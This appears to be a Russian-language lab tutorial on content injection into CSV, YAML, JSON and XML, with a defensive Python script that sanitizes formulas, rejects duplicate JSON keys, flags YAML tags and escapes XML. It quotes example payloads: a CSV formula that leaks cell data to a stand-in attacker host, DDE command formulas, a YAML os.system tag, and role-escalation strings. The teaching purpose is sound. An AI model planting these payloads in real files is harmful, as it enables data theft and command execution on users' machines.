## Перед началом: Контентные инъекции из репозитория `pwncollege/injection-dojo` (`CSV`, `YAML`, `JSON`, `XML`)

В официальном репозитории **`pwn.college` (`github.com/pwncollege/injection-dojo`)** собраны четыре специальные директории практических задач: **`csv/`**, **`yaml/`**, **`json/`** и **`xml/`**. Авторы курса показывают фундаментальную идею: **инъекция возможна в любой текстовый формат данных**, если программа собирает документ склейкой строк или использует небезопасный десериализатор!

Разберём все четыре модуля из `pwncollege/injection-dojo`:
1. **Модуль `csv/` — Инъекция табличных формул (`CSV Formula Injection / DDE`)**:
   Когда финансовый сервис выгружает отчёт в формате `.csv`, а в поле «Комментарий к платежу» пользователь указал строку, начинающуюся со знака **`=`**, **`+`**, **`-`** или **`@`** (например, `=HYPERLINK("http://attacker.example/leak?v="&A2)` или `=CMD|' /C calc'!A0`), табличный процессор (`Excel` / `LibreOffice Calc`) при открытии файла воспринимает ячейку не как текст, а как **исполняемую формулу**!
   **Защита**: если строковое значение ячейки при экспорте в CSV начинается с любого из символов `=`, `+`, `-`, `@`, `\t`, `\r`, перед ним ставится одиночный апостроф `'` (например, `'=SUM(A1:A2)`), который заставляет табличный редактор трактовать содержимое строго как обычный текст.
2. **Модуль `yaml/` — Небезопасная загрузка объектов в `YAML` (`yaml.load` против `yaml.safe_load`)**:
   Формат `YAML` поддерживает специальные теги типов (например, `!!python/object/apply:os.system ["id"]`). Если сервер вызывает `yaml.load(data, Loader=yaml.Loader)`, парсер прямо во время чтения конфигурационного файла конструирует и вызывает произвольные функции Python!
   **Защита**: всегда использовать исключительно **`yaml.safe_load()`**, который разрешает только базовые скалярные типы, списки и словари.
3. **Модуль `json/` — Склейка JSON-строк и дублирование ключей (`Duplicate Key Override`)**:
   Если сервер формирует JSON-сообщение для внутреннего микросервиса через f-строку:
   ```text
   payload = f'{{"user": "{username}", "role": "guest"}}'
   ```
   и пользователь передаёт в `username` строку `alice", "role": "admin`, то в итоговом JSON ключ `"role"` встречается **дважды**: `{"user": "alice", "role": "admin", "role": "guest"}` (или наоборот, если инъекция стоит в последнем поле!). Разные парсеры (`Python json.loads`, `Go encoding/json`, `JavaScript JSON.parse`) по-разному выбирают между первым и последним дублирующимся ключом, что приводит к повышению привилегий.
   **Защита**: никогда не собирать JSON конкатенацией — использовать только `json.dumps()` и при приёме запрещать дубликаты ключей через `object_pairs_hook`.
4. **Модуль `xml/` — Инъекция тегов и атрибутов при сборке XML**:
   Если в шаблон `<account><user>{name}</user><role>user</role></account>` подставить `bob</user><role>admin</role><user>x`, структура дерева XML меняется без единой ошибки синтаксиса.

## Почему это работает: Принцип сериализации через дерево объектов (`Serializer`), а не через шаблоны текста

Когда данные передаются в штатный сериализатор (`json.dumps`, `csv.writer` с экранированием префиксов формул, `xml.sax.saxutils.escape`), спецсимволы формата (`"`, `\`, `<`, `>`, `&`) автоматически экранируются и не могут создать новый узел или ключ в документе.

<!-- preparation -->

В этом практикуме ты создашь в `lab.py` защитный фильтр для всех четырёх модулей из репозитория `pwncollege/injection-dojo` (`csv`, `yaml`, `json`, `xml`): проверишь перехват дубликатов ключей в JSON через `object_pairs_hook`, блокировку тегов `!!python/` в YAML, обезвреживание формул CSV и экранирование XML.

## Сделай сейчас: Проверь все 4 вектора из `pwncollege/injection-dojo` (`CSV`, `YAML`, `JSON`, `XML`) в `lab.py`

### Шаг 1. Создай файл `lab.py`

Создай скрипт `lab.py`:

```python
import json
from xml.sax.saxutils import escape as xml_escape

FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_csv_cell(value):
    text = str(value)
    if text.startswith(FORMULA_PREFIXES):
        return "'" + text
    return text


def strict_json_loads(raw_json):
    def reject_duplicate_keys(pairs):
        seen = set()
        result = {}
        for k, v in pairs:
            if k in seen:
                raise ValueError(f"duplicate_json_key:{k}")
            seen.add(k)
            result[k] = v
        return result

    return json.loads(raw_json, object_pairs_hook=reject_duplicate_keys)


def safe_yaml_tag_check(yaml_text):
    if "!!" in yaml_text:
        return "BLOCKED:unsafe_yaml_custom_tag_detected"
    return "SAFE:standard_yaml_scalars_only"


def build_xml_record(vuln_mode, username):
    if vuln_mode:
        return f"<user><name>{username}</name><role>guest</role></user>"
    return f"<user><name>{xml_escape(username)}</name><role>guest</role></user>"


print("csv_sanitized=", sanitize_csv_cell("=HYPERLINK(\"http://evil.htb\")"))

injected_json = '{"user": "alice", "role": "guest", "role": "admin"}'
print("std_json_last_wins=", json.loads(injected_json)["role"])
try:
    strict_json_loads(injected_json)
except ValueError as err:
    print("strict_json_guard=", str(err))

print("yaml_check=", safe_yaml_tag_check("cmd: !!python/object/apply:os.system ['id']"))
xml_out = build_xml_record(vuln_mode=False, username="bob</name><role>admin</role><name>")
print("xml_escaped_safe=", "<role>admin</role>" not in xml_out)
```

### Шаг 2. Запусти программу и проверь срабатывание всех 4 защитных механизмов

Выполни в терминале:

```bash
python3 lab.py
```

**Ожидаемый результат на экране:**

```text
csv_sanitized= '=HYPERLINK("http://evil.htb")
std_json_last_wins= admin
strict_json_guard= duplicate_json_key:role
yaml_check= BLOCKED:unsafe_yaml_custom_tag_detected
xml_escaped_safe= True
```

Разберём результаты:
- в модуле `csv` опасная формула `=HYPERLINK(...)` получила ведущий апостроф `'=HYPERLINK(...)`, благодаря чему Excel и LibreOffice отобразят её как обычную текстовую строку;
- в модуле `json` стандартный `json.loads` молча перезаписал `"role": "guest"` вторым ключом `"role": "admin"` (`std_json_last_wins= admin`), тогда как `strict_json_loads` с хуком `object_pairs_hook` мгновенно заблокировал дубликат (`duplicate_json_key:role`);
- в модуле `yaml` детектор заблокировал десериализацию произвольного объекта `!!python/object/apply`, а в модуле `xml` функция `xml_escape` превратила `<role>admin</role>` в безопасные сущности `&lt;role&gt;admin&lt;/role&gt;` (`xml_escaped_safe= True`).

### Шаг 3. Проверь генерацию JSON через `json.dumps` в терминале Kali

В файле `lab.py` замени `=HYPERLINK(...)` на `@SUM(1+1)*cmd|' /C calc'!A0`, сохрани и запусти `python3 lab.py` — фильтр `sanitize_csv_cell` также обезвредит префикс `@`. После проверки верни исходную строку.

В терминале Kali проверь, как `json.dumps` экранирует кавычки при попытке инъекции ключа:

```bash
python3 -c 'import json; u="alice\", \"role\": \"admin"; print(json.dumps({"user": u, "role": "guest"}))'
```

## Почему это работает: Почему дублирование ключей в JSON официально разрешено стандартом RFC 8259

Стандарт `RFC 8259 (раздел 4)` указывает лишь, что имена ключей в JSON-объекте «должны быть уникальными» (`SHOULD be unique`), но не обязывает парсер выбрасывать ошибку при повторе ключа! Из-за этого прокси-сервер проверки прав на Go или C# может прочитать **первый** ключ `"role": "guest"`, а бэкенд на Python или Node.js выполнит действие от имени **последнего** ключа `"role": "admin"`.

## Если не получилось: Частые ошибки

- **Забывать про символы `+`, `-` и `@` при защите CSV**: в Excel и Google Sheets формула может начинаться не только со знака равенства `=`, но и с `+`, `-` или `@`, поэтому все четыре префикса обязаны экранироваться.
